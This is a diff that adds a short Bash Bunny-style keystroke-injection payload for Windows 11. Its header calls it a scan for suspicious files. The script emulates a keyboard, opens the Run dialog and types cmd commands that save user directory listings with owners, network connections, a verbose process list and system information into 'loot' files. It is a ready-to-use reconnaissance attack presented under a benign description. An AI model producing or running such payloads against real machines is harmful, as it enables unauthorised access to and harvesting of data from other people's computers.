@@ -1,0 +1,28 @@
+#!/bin/bash
+# Title: Windows 11 Scan Payload
+# Author: Tyler Crum "TUKRU"
+# Version: 1.0
+# Description: Scans Windows 11 for suspicious files and data
+
+# Setup
+ATTACKMODE HID
+LED SETUP
+
+# Payload
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING cmd /c "dir C:\Users /a /q > loot\users.txt"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING cmd /c "netstat -ano > loot\netstat.txt"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING cmd /c "tasklist /v > loot\tasklist.txt"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING cmd /c "systeminfo > loot\systeminfo.txt"
+QUACK ENTER
+QUACK DELAY 500
+
+# Cleanup
+LED FINISH
